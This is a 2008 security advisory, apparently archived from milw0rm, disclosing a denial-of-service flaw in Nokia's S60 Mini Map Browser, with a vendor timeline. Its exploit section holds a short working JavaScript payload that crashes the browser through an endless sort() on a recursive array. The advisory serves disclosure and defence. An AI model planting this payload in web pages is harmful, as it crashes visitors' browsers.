@@ -1,0 +1,103 @@
+==================================================== 
+Security Research Advisory
+
+Vulnerability name: Nokia Browser Array Sort Denial Of Service Vulnerability
+Advisory number: LC-2008-04
+Advisory URL: http://www.ikkisoft.com
+
+==================================================== 
+1) Affected Software 
+
+* Nokia Mini Map Browser (S60WebKit <= 21772) 
+
+The tested device has the following User-Agent: 
+Mozilla/5.0 (SymbianOS/9.2;U;Series60/3.1 NokiaE90-1/210.34.75 
+Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML) 
+Safari/413
+
+Note: Although the Nokia Web Browser is built upon a port of the 
+open source WebKit used by Apple for its browser, the iPhone is not 
+affected (at least the iPhone firmware version 2.0.2(5C1))
+
+====================================================
+2) Severity 
+
+Severity: Low
+Local/Remote: Remote
+
+==================================================== 
+3) Summary
+
+The Web Browser for S60 (formally called Nokia Mini Map Browser) is a web 
+browser for the S60 mobile phone platform developed by Nokia. 
+It is built upon S60WebKit, a port of the open source WebKit project to the S60
+platform. According to several sources, the S60 software on Symbian OS is the 
+world’s most popular software for smartphones.
+
+This version of the Nokia Mini Map Browser does not properly validate JavaScript
+input embedded in visited HTML pages. An aggressor can easily trigger Denial of
+Service attacks.
+
+References:
+http://opensource.nokia.com/projects/S60browser/ 
+http://en.wikipedia.org/wiki/Web_Browser_for_S60
+
+====================================================
+4) Vulnerability Details
+
+The Nokia Mini Map Browser is prone to a vulnerability that may result in the 
+application silent crash. Arbitrary code execution is probably not possible.
+The problem arises in the JavaScript core of the S60WebKit, invoking the sort() 
+function on a recursive array.
+A similar behavior was observed some years ago in several browsers due to 
+the common code base (BID-12331, BID-11762, BID-11760, BID-11759, 
+BID-11752).
+
+==================================================== 
+5) Exploit 
+
+Embed in an HTML page the following JavaScript:
+<script>
+foo = new Array();
+while(true) {foo = new Array(foo).sort();}
+</script>
+
+==================================================== 
+6) Fix Information 
+
+n/a
+
+==================================================== 
+7) Time Table 
+
+08/09/2008 - Vendor notified.
+15/09/2008 - Vendor response.
+??/??/???? - Vendor patch release.
+10/10/2008 - Public disclosure.
+
+==================================================== 
+8) Credits 
+
+Discovered by Luca Carettoni - luca.carettoni[at]ikkisoft[dot]com
+
+==================================================== 
+9) Legal Notices
+
+The information in the advisory is believed to be accurate at the time of
+publishing based on currently available information. 
+This information is provided as-is, as a free service to the community. 
+There are no warranties with regard to this information.
+The author does not accept any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+Permission is hereby granted for the redistribution of this alert, provided 
+that the content is not altered in any way, except reformatting, and that due 
+credit is given.
+
+This vulnerability has been disclosed in accordance with the RFP 
+Full-Disclosure Policy v2.0, available at:
+http://www.wiretrip.net/rfp/policy.html
+
+====================================================
+
+# milw0rm.com [2008-10-10]
